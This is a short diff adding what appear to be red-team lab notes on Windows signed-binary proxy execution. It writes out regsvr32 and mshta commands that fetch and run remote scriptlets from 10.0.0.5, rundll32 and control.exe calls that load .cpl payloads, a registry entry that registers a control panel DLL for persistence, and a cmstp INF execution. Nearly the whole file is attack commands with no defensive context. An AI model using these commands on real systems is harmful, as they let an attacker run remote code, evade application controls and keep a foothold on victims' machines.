@@ -1,0 +1,13 @@
+regsvr32.exe /s /i:http://10.0.0.5/back.sct scrobj.dll
+# from powershell
+/cmd /c mshta.exe javascript:a=(GetObject("script:http://10.0.0.5/m.sct")).Exec();close();
+control.exe .\FlashPlayerCPLApp.cpl
+# or
+rundll32.exe shell32.dll,Control_RunDLL file.cpl
+# or
+rundll32.exe shell32.dll,Control_RunDLLAsUser file.cpl
+rundll32 shell32, Control_RunDLL \\VBOXSVR\Experiments\cpldoubleclick
+\cpldoubleclick\Debug\cpldoubleclick.cpl
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Control Panel\CPLs" /v spotless /d "C:\labs\cplAddin\cplAddin\x64\Release\cplAddin2.dll" /f
+
+PS C:\experiments\cmstp> cmstp.exe /s .\f.inf
